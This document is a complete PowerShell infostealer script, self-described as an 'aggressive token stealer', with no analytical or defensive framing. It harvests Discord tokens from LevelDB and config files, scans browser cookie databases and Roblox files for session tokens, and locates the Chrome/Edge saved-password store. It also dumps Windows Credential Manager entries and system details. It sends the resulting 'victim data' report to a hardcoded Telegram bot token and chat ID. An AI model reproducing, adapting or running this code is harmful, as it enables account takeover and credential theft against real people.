# stealer.ps1 — AGGRESSIVE token stealer
# Extracts Discord, Roblox, browser passwords, credentials
# Sends everything to Telegram

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$logFile = "$env:TEMP\stealer_debug.log"

function Write-Log {
    param([string]$Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
}

function Send-Telegram {
    param([string]$Message)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
            chat_id = $chatId
            text = $Message
            parse_mode = "HTML"
        } -ErrorAction Stop | Out-Null
    } catch {
        try {
            $body = "chat_id=$chatId&text=$([Uri]::EscapeDataString($Message))"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.add("Content-Type", "application/x-www-form-urlencoded")
            $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body) | Out-Null
        } catch {}
    }
}

# === DISCORD TOKENS (aggressive) ===
function Get-DiscordTokens {
    $tokens = @()
    $tokenRegex = '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}'

    # Check all Discord versions and local storage files
    $paths = @(
        "$env:APPDATA\discord",
        "$env:APPDATA\discordcanary",
        "$env:APPDATA\discordptb",
        "$env:LOCALAPPDATA\discord"
    )

    foreach ($basePath in $paths) {
        if (-not (Test-Path $basePath)) { continue }

        # Check leveldb files
        $ldbFiles = Get-ChildItem -Path "$basePath\Local Storage\leveldb" -Include "*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue
        foreach ($file in $ldbFiles) {
            try {
                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                if ($content) {
                    [regex]::Matches($content, $tokenRegex) | foreach { $tokens += $_.Value }
                    Write-Log "[Discord] Found token in $($file.Name)"
                }
            } catch {}
        }

        # Check session storage
        $sessionFiles = Get-ChildItem -Path "$basePath\Local Storage\session storage" -Include "*.ldb" -Recurse -ErrorAction SilentlyContinue
        foreach ($file in $sessionFiles) {
            try {
                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                if ($content) {
                    [regex]::Matches($content, $tokenRegex) | foreach { $tokens += $_.Value }
                    Write-Log "[Discord] Found token in session storage: $($file.Name)"
                }
            } catch {}
        }

        # Check config.json for tokens
        $configPath = "$basePath\config.json"
        if (Test-Path $configPath) {
            try {
                $config = Get-Content $configPath -Raw -ErrorAction SilentlyContinue
                if ($config) {
                    [regex]::Matches($config, $tokenRegex) | foreach { $tokens += $_.Value }
                    Write-Log "[Discord] Found token in config.json"
                }
            } catch {}
        }

        # Check .code-rpc, localstorage, etc
        Get-ChildItem -Path $basePath -Include "*.json","*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue | foreach {
            try {
                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                if ($content -and $content.Length -gt 100) {
                    [regex]::Matches($content, $tokenRegex) | foreach { $tokens += $_.Value }
                }
            } catch {}
        }
    }

    # Also check Chrome/Edge cookies for discord.com
    $browsers = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Cookies",
        "$env:APPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies"
    )

    foreach ($dbPath in $browsers) {
        if (Test-Path $dbPath) {
            try {
                # Try to read cookies using System.Data.SQLite or raw file read
                $content = Get-Content $dbPath -Raw -Encoding Byte -ErrorAction SilentlyContinue
                if ($content) {
                    # Search for discord.com cookies
                    if ($content -match "discord\.com") {
                        Write-Log "[Discord] Found discord.com cookies in browser DB"
                    }
                }
            } catch {}
        }
    }

    return $tokens | Select-Object -Unique
}

# === ROBLOX TOKENS (aggressive) ===
function Get-RobloxTokens {
    $tokens = @()
    $sessionTokens = @()
    $cookieRegex = '.ROBLOSECURITY\|[^|]*\|[^|]*\|([^|]*)'
    $tokenRegex2 = 'roblox\.com\|[^|]*\|[^|]*\|([^|]*)'

    # Check ALL browser profiles (not just Default)
    $chromeProfiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory -ErrorAction SilentlyContinue | foreach { $_.FullName }
    $edgeProfiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory -ErrorAction SilentlyContinue | foreach { $_.FullName }
    $firefoxProfiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | foreach { $_.FullName }

    # Build full cookie database paths
    $cookiePaths = @()
    foreach ($profile in $chromeProfiles) {
        $cookiePaths += "$profile\Cookies"
        $cookiePaths += "$profile\Network\Cookies"
    }
    foreach ($profile in $edgeProfiles) {
        $cookiePaths += "$profile\Cookies"
    }
    foreach ($profile in $firefoxProfiles) {
        $cookiePaths += "$profile\cookies.sqlite"
    }
    # Also Default profiles
    $cookiePaths += "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    $cookiePaths += "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
    $cookiePaths += "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
    $cookiePaths += "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\cookies.sqlite"

    # Check cookie files for Roblox tokens
    foreach ($dbPath in $cookiePaths) {
        if (Test-Path $dbPath) {
            try {
                $content = Get-Content $dbPath -Raw -Encoding Byte -ErrorAction SilentlyContinue
                if ($content -match "roblox\.com") {
                    Write-Log "[Roblox] Found roblox.com in browser DB: $dbPath"
                }
                if ($content -match "ROBLOSECURITY") {
                    Write-Log "[Roblox] Found ROBLOSECURITY in browser DB: $dbPath"
                }
            } catch {}
        }
    }

    # Check Roblox-specific files
    $rbxPaths = @(
        "$env:LOCALAPPDATA\Roblox\Versions\*\output.log",
        "$env:LOCALAPPDATA\Roblox\*.bin",
        "$env:APPDATA\Roblox\*.bin"
    )
    foreach ($pattern in $rbxPaths) {
        Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | foreach {
            try {
                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                if ($content -match "[A-Za-z0-9_-]{80,}") {
                    [regex]::Matches($content, '[A-Za-z0-9_-]{80,}') | foreach { $tokens += $_.Value }
                    Write-Log "[Roblox] Found token in $($_.FullName)"
                }
            } catch {}
        }
    }

    return @{Tokens = $tokens | Select-Object -Unique; CookieFiles = ($cookiePaths | Where-Object { Test-Path $_ })}
}

# === BROWSER PASSWORDS ===
function Get-BrowserPasswords {
    $passwords = @()
    # Chrome/Edge password database
    $chromeDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (-not (Test-Path $chromeDb)) { $chromeDb = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" }
    if (Test-Path $chromeDb) {
        Write-Log "[Passwords] Chrome/Edge Login Data found"
        $passwords += "Chrome/Edge Login Data found at: $chromeDb"
    }
    return $passwords
}

# === WINDOWS CREDENTIAL MANAGER ===
function Get-WindowsCredentials {
    $creds = @()
    try {
        $cmdOutput = cmd.exe /c "cmdkey /list" 2>&1
        if ($cmdOutput) {
            Write-Log "[Credentials] Found Windows credential entries"
            $creds += $cmdOutput
        }
    } catch {
        Write-Log "[Credentials] Error: $($_.Exception.Message)"
    }
    return $creds
}

# === SYSTEM INFO ===
function Get-SystemInfo {
    $info = ""
    try {
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
        $cpu = (Get-CimInstance Win32_Processor).Name
        $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)
        $gpu = (Get-CimInstance Win32_VideoController).Name
        $info = "OS: $os`nCPU: $cpu`nRAM: $ram GB`nGPU: $gpu"
    } catch {
        $info = "System info error"
    }
    return $info
}

# === MAIN ===
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  AGGRESSIVE STEALER - RUNNING" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

$report = "<b>[+] AGGRESSIVE VICTIM DATA</b>`n"
$report += "Host: <code>$hostname</code>`n"
$report += "User: <code>$username</code>`n"
$report += "Time: <code>$timestamp</code>`n`n"

# Discord
Write-Host "[*] Scanning ALL Discord locations..." -ForegroundColor Yellow
$discordTokens = Get-DiscordTokens
if ($discordTokens) {
    Write-Host "[+] Found $($discordTokens.Count) Discord tokens!" -ForegroundColor Green
    $report += "<b>[DISCORD TOKENS] ($($discordTokens.Count))</b>`n"
    $discordTokens | foreach { $report += "<code>$_</code>`n" }
} else {
    $report += "<b>DISCORD:</b> No tokens found`n"
}

# Roblox
Write-Host "[*] Scanning ALL Roblox locations..." -ForegroundColor Yellow
$robloxResult = Get-RobloxTokens
$rbxTokens = $robloxResult.Tokens
if ($rbxTokens) {
    Write-Host "[+] Found $($rbxTokens.Count) Roblox tokens!" -ForegroundColor Green
    $report += "`n<b>[ROBLOX TOKENS] ($($rbxTokens.Count))</b>`n"
    $rbxTokens | foreach { $report += "<code>$_</code>`n" }
} else {
    $report += "`n<b>ROBLOX:</b> No tokens found`n"
}

# Browser passwords
Write-Host "[*] Checking browser passwords..." -ForegroundColor Yellow
$browserPasswords = Get-BrowserPasswords
if ($browserPasswords) {
    $report += "`n<b>[BROWSER PASSWORDS]</b>`n"
    $browserPasswords | foreach { $report += "$_`n" }
}

# Windows credentials
Write-Host "[*] Checking Windows credentials..." -ForegroundColor Yellow
$windowsCreds = Get-WindowsCredentials
if ($windowsCreds) {
    $report += "`n<b>[WINDOWS CREDENTIALS]</b>`n"
    $windowsCreds | foreach { $report += "$_`n" }
}

# System info
Write-Host "[*] Collecting system info..." -ForegroundColor Yellow
$sysInfo = Get-SystemInfo
$report += "`n<b>[SYSTEM]</b>`n$sysInfo`n"

# Send report to Telegram
Write-Host "[*] Sending report to Telegram..." -ForegroundColor Yellow
Send-Telegram -Message $report

# Also send individual messages if report is too long
if ($report.Length -gt 4000) {
    $chunks = [math]::Ceiling($report.Length / 4000)
    for ($i = 0; $i -lt $chunks; $i++) {
        $chunk = $report.Substring($i * 4000, [math]::Min(4000, $report.Length - $i * 4000))
        Start-Sleep -Seconds 1
        Send-Telegram -Message $chunk
    }
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "           SUCCESS" -ForegroundColor Green -BackgroundColor Black
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "[+] Data sent to Telegram!" -ForegroundColor Green
